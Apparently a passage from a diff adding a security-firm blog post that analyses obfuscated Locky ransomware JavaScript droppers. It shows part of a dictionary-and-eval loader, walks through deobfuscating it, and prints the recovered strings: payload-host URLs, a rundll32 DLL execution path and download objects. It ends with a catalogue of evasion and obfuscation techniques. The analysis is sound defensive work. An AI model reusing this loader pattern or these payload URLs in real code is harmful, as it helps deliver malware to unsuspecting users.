&quot;VAg&quot;: &quot;\x20&quot;, &quot;Zf&quot;: &quot;\x21&quot;, &quot;QTk&quot;: &quot;\x31&quot;, &quot;Su&quot;: &quot;\x30&quot;, &quot;AJl&quot;: &quot;\x33&quot;, &quot;WZw&quot;: &quot;\x32&quot;, &quot;MOw&quot;: &quot;\x35&quot;, &quot;SQv&quot;: &quot;\x34&quot;, &quot;EJf&quot;: &quot;\x37&quot;, &quot;Ai&quot;: &quot;\x36&quot;, &quot;Wc&quot;: &quot;\x39&quot;, &quot;AJa&quot;: &quot;\x38&quot;, &quot;RKf&quot;: &quot;\x3a&quot;, &quot;BXq&quot;: &quot;\x3c&quot;, &quot;Bu&quot;: &quot;\x3b&quot;, &quot;Ku&quot;: &quot;\x3e&quot;, &quot;Vg&quot;: &quot;\x3d&quot;, &quot;Nq&quot;: &quot;F&quot;, &quot;KOl&quot;: &quot;J&quot;, &quot;Vr&quot;: &quot;N&quot;, &quot;YDx&quot;: &quot;R&quot;, &quot;Sc&quot;: &quot;V&quot;, &quot;Yc&quot;: &quot;Z&quot;, &quot;Hy&quot;: &quot;b&quot;, &quot;QCc&quot;: &quot;\x40&quot;, &quot;Jm&quot;: &quot;f&quot;, &quot;Cy&quot;: &quot;j&quot;, &quot;Ov&quot;: &quot;n&quot;, &quot;KYf&quot;: &quot;r&quot;, &quot;Kh&quot;: &quot;v&quot;, &quot;Bs&quot;: &quot;z&quot;, &quot;VTu&quot;: &quot;B&quot;, &quot;Eu&quot;: &quot;u&quot;, &quot;DBm&quot;: &quot;A&quot;, &quot;Ri&quot;: &quot;E&quot;, &quot;AIg&quot;: &quot;I&quot;, &quot;FGr&quot;: &quot;M&quot;, &quot;Ol&quot;: &quot;Q&quot;, &quot;HOs&quot;: &quot;U&quot;, &quot;QZt&quot;: &quot;Y&quot;, &quot;Nv0&quot;: &quot;a&quot;, &quot;Zs&quot;: &quot;e&quot;, &quot;EPs&quot;: &quot;i&quot;, &quot;Ao&quot;: &quot;m&quot;, &quot;ZJo&quot;: &quot;q&quot;, &quot;Df&quot;: &quot;\x5f&quot;, &quot;MAp&quot;: &quot;\x5e&quot;, &quot;Ny&quot;: &quot;\x5d&quot;, &quot;Yr&quot;: &quot;\x5c&quot;, &quot;CXz&quot;: &quot;\x5b&quot;, &quot;WUh&quot;: &quot;y&quot;};
+
+
+var i;
+for (i = 0; i &lt; array[&quot;length&quot;]; i++)
+{
+    code += dictionary[array[i]];
+}
+eval(code);
+
+try {&lt;Loads of whitespaces and gibberish&gt;}
+catch{}
+
+&lt;Entire copy of all of the above&gt;
+</code></pre>
+<p>Each entry in the array represents a character of a new piece of JavaScript code. The for-loop then uses the dictionary to translate the array and concatenate it into a long string, which is then passed on to <code>eval</code>. The generated string is way too long to construct by hand, which is why we want to run the code and use its own algorithms to reconstruct this string for us. Instead of executing the final string as JavaScript through <code>eval</code>, we only want to see its content. This is easily achieved by replacing &ldquo;<code>eval(code)</code>&rdquo; with &ldquo;<code>console.log(code)</code>&rdquo; in the code. We can then copy it into a Chrome console (opened with F12 in a Chrome browser) and run it. Unfortunately, the script produces an error in the function <code>verifyComSpec</code>, preventing us from obtaining the string. <code>verifyComSpec</code> uses a WScript shell to compare the path of the default command line interpreter with &ldquo;%SystemRoot%\system32\cmd.exe&rdquo;. This function ensures that the rest of the code will only execute if the meets the environmental requirements, which helps in remaining stealthy and hindering analysis. This script is unable to access WScript through the Chrome console, resulting in the error which prevents the remainder of the code from running. As this function does nothing for us other than potentially close the script or produce an error, we can simply remove the call to <code>verifyComSpec</code> to avoid this error and successfully extract the generated string containing JavaScript instructions:</p>
+<figure><img src="../../static/images/blog/locky-dropper/chromeconsole.png">
+</figure>
+
+<p>This reveals the long and strongly obfuscated script, which consists of a section of variables containing short strings, integers in arrays, and a lot of obfuscated code. Although the obfuscation techniques are not very complex individually, completely deobfuscating this code is still quite time consuming due to the variety in and degree of obfuscation (namely on the integers) and code complexity. Luckily the strings held by the variables declared at the start of this second layer of code are (inversely) ordered, and will get concatenated in that way throughout the rest of the script to produce the required strings for the dropper functions. If we directly concatenate all the strings that way, we obtain the following string:</p>
+<pre><code>1123132iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiilengthiiiiiiiiiiiilengthasfasdfasfdiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiilength437http://darkestzone2.wang/7b5hfthttp://bookinghotworld.ws/18p0no4ehttp://canonsupervideo4k.ws/54m7lt3http://videoconvertermac.in/ofyvi52bhttp://listofbuyersus.co.in/jos0kCreateObjectWScript.Shell%TEMP%/yCUaJgsq.dllSystemPROCESSOR_ARCHITECTUREamd64%SystemRoot%\\SysWOW64\\rundll32.exe%SystemRoot%\\system32\\rundll32.exefloorMSXML2.XMLHTTPWinHttp.WinHttpRequest.5.1lengthCreateObjectScripting.FileSystemObjectFileExists.txtFileExistsWScriptQuitlengthopenGETlengthsendSleepCreateObjectADODB.StreamopentypewriteResponseBodypositionSaveToFilecloselengthlengthRun,qwerty3SleeplengthlengthlengthlengthlengthsplicelengthlengthCreateObjectADODB.StreamtypeCharsetopenLoadFromFileReadTextcloselengthcharCodeAtpushCreateObjectADODB.StreamtypeCharsetopenwriteTextSaveToFilecloselengthfromCharCodejoin
+</code></pre>
+<p>This string contains many keywords that we associated with dropper features throughout this analysis. Even though the generated code contains a lot more complicated and heavily obfuscated code, the intentions of this script are clear. Despite the original code only containing one suspicious word directly, it was able to construct all other keywords required to establish dropper features. To make matters worse, <a href="http://jsfuck.com">http://jsfuck.com</a> provides this example: <code>eval(&quot;&lt;code&gt;&quot;) === [][&quot;filter&quot;][&quot;constructor&quot;](&quot;&lt;code&gt;&quot;)()</code>, demonstrating that even <code>eval</code> itself can be obfuscated. This means the absence of any suspicious words in a particular script is not enough to establish it is benign.</p>
+<p>An interesting slice of this string that we haven&rsquo;t seen before is &ldquo;PROCESSOR_ARCHITECTURE&rdquo;. Tracing the variables containing this string reveals it is used to locate <code>rundll32.exe</code> for compatibility with the AMD64 processor architecture. Locating it is necessary as this script saves the payload to disk as a DLL and runs it with <code>rundll32.exe</code>, rather than using <code>eval</code> or WScript&rsquo;s <code>Run</code> like the droppers in the previous examples.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>In order for a script to establish dropper capabilities and play its part in the infection chain, it needs to contain:</p>
+<ul>
+<li>
+<p><strong>one or more URLs</strong>
+<code>pointing to compromised domains holding the payload</code></p>
+</li>
+<li>
+<p><strong>an agent using the HTTP protocol to communicate with a server</strong>
+<code>usually WScript or ActiveXObject using MSXML.HTTP2 or WinHttpRequest</code></p>
+</li>
+<li>
+<p><strong>instructions to request and receive the payload from one or more URLs</strong>
+<code>HTTP GET request from URL through agent</code></p>
+<p><code>ADODB.STREAM is often used for writing the payload to a file</code></p>
+</li>
+<li>
+<p><strong>instruction to execute the payload</strong>
+<code>eval, WScript's Run, rundll32.exe</code></p>
+</li>
+</ul>
+<p>Only very little code is needed in order to establish the actual dropper features, and the vast majority of code throughout the droppers in our sample set is dedicated to hindering analysis. This code usually consists of techniques to hide the dropper features and other suspicious or sensitive information from analysis. These techniques can be further divided into two categories:</p>
+<ul>
+<li>
+<p><strong>evasion techniques</strong>
+<code>which are aimed at counteracting dynamic analysis and remaining undetected. They usually are functions performing a variety of tests and checking environmental parameters, in order to verify that the machine is &quot;real&quot; and infectable. These functions generally govern whether or not to initiate an attempt to infect the system. This helps in avoiding detection, and hinders dynamic analysis by making the code incompatible with configurations other than the targeted. Evasion is ususally attempted by closing the script, skipping execution of the dropper section, or producing an error.</code></p>
+</li>
+<li>
+<p><strong>obfuscation techniques</strong>
+<code>that hinder static analysis by making the code long, overly complex and unreadable without adding features. It needs to be deobfuscated to reveal the underlying code in order to determine its intent or statically analyse it. These are some obfuscation methods commonly deployed by the dropper samples in our collection:</code></p>
+<ul>
+<li>
+<p>randomization of all names throughout the script</p>
+</li>
+<li>
+<p>removal of all code styling and indentation</p>
+</li>
+<li>
+<p>complication and expansion of code by adding steps, functions, and control flows that could be simplified.</p>
+</li>
+<li>
+<p>string substitution through variables, <code>fromcharcode</code>, ASCII/hexa/octal/binary representation</p>
+</li>
+<li>
+<p>string operators like <code>charcodeat</code>, <code>split</code>, <code>join</code>, and custom string operators declared through <code>string.prototype</code></p>
+</li>
+<li>
+<p>obfuscation of numbers through mathematical functions</p>
+</li>
+<li>
+<p>encrypting of additional code as data, to be decrypted and ran through <code>eval</code></p>
+</li>
+<li>
+<p>encrypting of data with common (base64, XOR) or custom algorithms</p>
+</li>
+<li>
+<p>addition of junk code</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>The obfuscation usually makes analysing by hand very time consuming. Cuckoo is able to automatically analyse these samples and can produce and verify the findings we obtained through static analysis. While static antivirus engines are able to identify a sample as malicious and specify its family, this information does not go a long way towards attribution or the discovery of new indicators of compromise. In contrast, <code>Cuckoo and Triage</code>_ will provide a wealth of information about the workings of and specific actions undertaken by the sample. They are able to follow and map the entire chain of infection, which is crucial in understanding the role the droppers play in it.</p>
+<figure><img src="../../static/images/blog/locky-dropper/structure.png"><figcaption>
+      <h4>A visual representation of the characteristic code structure of these droppers</h4>
+    </figcaption>
+</figure>
+
+
+    
+  </section>
+</article>
+
+
+<section class="view-context blog-recommendations">
+  <article class="view-context__body">
+    <h2>You may also like:</h2>
+    
+    <ul>
+      
+        <li>
+          <h3>Why We Want More Arbiters</h3>
+          <br>
+          <a class="button button-variant-3" href="https://hatching.io/blog/why-we-want-more-arbiters/">Read</a>
+        </li>
+      
+        <li>
+          <h3>Triage Thursday Ep. 93</h3>
+          <br>
+          <a class="button button-variant-3" href="https://hatching.io/blog/tt-2023-07-28/">Read</a>
+        </li>
+      
+        <li>
+          <h3>Ep. 139: Triage Thursday</h3>
+          <br>
+          <a class="button button-variant-3" href="https://hatching.io/blog/tt-2024-07-11/">Read</a>
+        </li>
+      
+        <li>
+          <h3>Ep. 138: Triage Thursday</h3>
+          <br>
+          <a class="button button-variant-3" href="https://hatching.io/blog/tt-2024-07-04/">Read</a>
+        </li>
+      
+    </ul>
+  </article>
+</section>
+    <footer class="scheme-4 view-context footer" id="contact">
+      <article class="view-context__body">
+        <h2>Want to know more?<br />Get in touch!</h2>
+        <a class="button button-variant-1" target="_blank" href="https://go.recordedfuture.com/enterprise-sandbox-contact-us" i>Contact us</a>
+        <ul>
+          <li>
+            <ul>
+              <li class="logo"><img src="https://hatching.io/static/images/rf-hatching-white.svg" alt="hatching"/></li>
+              <li class="social">
+                <a href="https://twitter.com/hatching_io" target="_blank">
+                  <i class="icon-twitter"></i>
+                </a>
+                <a href="https://www.linkedin.com/company/hatching" target="_blank">
+                  <i class="icon-linkedin"></i>
+                </a>
+                <a href="https://www.github.com/hatching" target="_blank">
+                  <i class="icon-github"></i>
+                </a>
+              </li>
+            </ul>
+          </li>
+          <li>
+            Hatching International B.V.<br />
+            The Netherlands<br/>
+            <br />
+            Email us: <a href="mailto:info@hatching.io">info@hatching.io</a>
+          </li>
+          <li>
+            IBAN: NL52 INGB 0006 9672 73<br />
+            BIC: INGBNL2A<br />
+            ING Groep N.V.<br />
+            Amsterdam-Zuidoost<br />
+            <br />
+            REG: 64146707<br />
+            VAT: NL855541891B01
+          </li>
+        </ul>
+      </article>
+      <div class="form hidden">
+        <div class="form-logo">
+          <img src="https://hatching.io/static/images/rf-hatching-white.svg" alt="Hatching"/>
+        </div>
+        <a href="#" class="form-close" title="Close (or press esc)"></a>
+
+        <div class="container">
+          <h1>Contact us</h1>
+          <h3>Feel free to inquire or request about our services.</h3>
+          <form>
+            <fieldset>
+              <div class="field">
+                <div class="input is-required">
+                  <input id="form-name" name="name" placeholder="Name" />
+                </div>
+              </div>
+              <div class="field">
+                <div class="input is-required">
+                  <input id="form-email" name="email" placeholder="Email" />
+                </div>
+              </div>
+              <div class="field">
+                <div class="input">
+                  <input id="form-phone" name="phone" placeholder="Phone number" />
+                </div>
+              </div>
+              <div class="field">
+                <div class="input">
+                  <input id="form-company" name="company" placeholder="Company" />
+                </div>
+              </div>
+            </fieldset>
+            <fieldset>
+              <div class="input required">
+                <textarea id="form-message" name="message" placeholder="Write a message"></textarea>
+              </div>
+              <div class="button-group">
+                <button type="reset" class="button button-variant-2 button-transparent">Reset</button>
+                <button type="submit" class="button button-variant-1">Send</button>
+              </div>
+            </fieldset>
+          </form>
+        </div>
+
+      </div>
+    </footer>
+    <script src="https://hatching.io/static/js/hatching.js?1726233262"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+          if(window.main && window.main instanceof Function) {
+            window.main();
+          }
+          initForm();
+
+          
+          
+        });
+    </script>
+  </body>
+</html>
